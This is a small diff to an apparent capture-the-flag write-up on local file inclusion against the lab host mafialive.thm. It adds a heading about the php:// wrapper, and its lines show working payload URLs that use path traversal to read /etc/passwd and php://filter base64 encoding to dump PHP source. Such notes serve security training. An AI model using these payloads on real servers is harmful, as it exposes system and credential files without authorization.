@@ -125,6 +125,8 @@ http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobots.ph
 (LFI is behind the directory not behind the view parameter)
 http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//etc/passwd 
 
+Using php:// (php wrapper for LFI)
+----------------------------------
 In order to read the source code of mrrobots.php use php://filter wrapper
 http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php
 http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
